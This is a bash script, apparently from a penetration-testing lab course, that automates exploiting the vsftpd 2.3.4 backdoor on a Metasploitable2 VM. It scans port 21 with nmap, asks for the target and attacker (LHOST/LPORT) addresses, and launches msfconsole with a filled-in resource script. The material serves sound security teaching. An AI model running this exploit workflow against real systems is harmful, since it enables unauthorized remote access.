#!/usr/bin/env bash
# Task 7: Metasploit — exploit vsftpd 2.3.4 backdoor on Metasploitable2.
# Requires a separate Metasploitable2 VM already running (VirtualBox) and
# reachable from Kali — this is a real second machine, not something Docker
# can stand in for.
set -euo pipefail
ACTION="${1:-start}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RC_TEMPLATE="$DIR/exploit_vsftpd.rc"
RC_RUN="$DIR/.exploit_vsftpd_run.rc"

require_msf() {
    command -v msfconsole >/dev/null 2>&1 || { echo "msfconsole not found. Install Metasploit Framework."; exit 1; }
}

require_nmap() {
    command -v nmap >/dev/null 2>&1 || { echo "nmap not found. Install: sudo apt install nmap"; exit 1; }
}

recon() {
    local target="$1"
    echo "== Nmap recon: checking port 21 on $target =="
    local result
    result="$(nmap -sV -p 21 "$target")"
    echo "$result"
    if echo "$result" | grep -q "vsftpd 2.3.4"; then
        echo ">> vsftpd 2.3.4 confirmed — target is vulnerable, proceeding."
        return 0
    else
        echo ">> vsftpd 2.3.4 NOT detected on port 21 — this exploit will not work against this target."
        read -rp "Continue anyway? [y/N]: " force
        [[ "$force" == "y" || "$force" == "Y" ]]
    fi
}

case "$ACTION" in
    start)
        require_msf
        require_nmap
        sudo service postgresql start >/dev/null 2>&1 || true

        read -rp "Metasploitable2 target IP (RHOSTS): " RHOSTS
        recon "$RHOSTS" || { echo "Aborted."; exit 1; }

        read -rp "Your Kali attacker IP (LHOST): " LHOST
        read -rp "LPORT [3435]: " LPORT
        LPORT="${LPORT:-3435}"

        sed -e "s/__RHOSTS__/$RHOSTS/" -e "s/__LHOST__/$LHOST/" -e "s/__LPORT__/$LPORT/" \
            "$RC_TEMPLATE" > "$RC_RUN"

        echo "Running exploit against $RHOSTS ..."
        msfconsole -q -r "$RC_RUN"
        ;;
    stop)
        rm -f "$RC_RUN"
        echo "Cleaned up generated resource script (msfconsole session itself must be exited manually)."
        ;;
    *)
        echo "Usage: $0 {start|stop}"; exit 1 ;;
esac
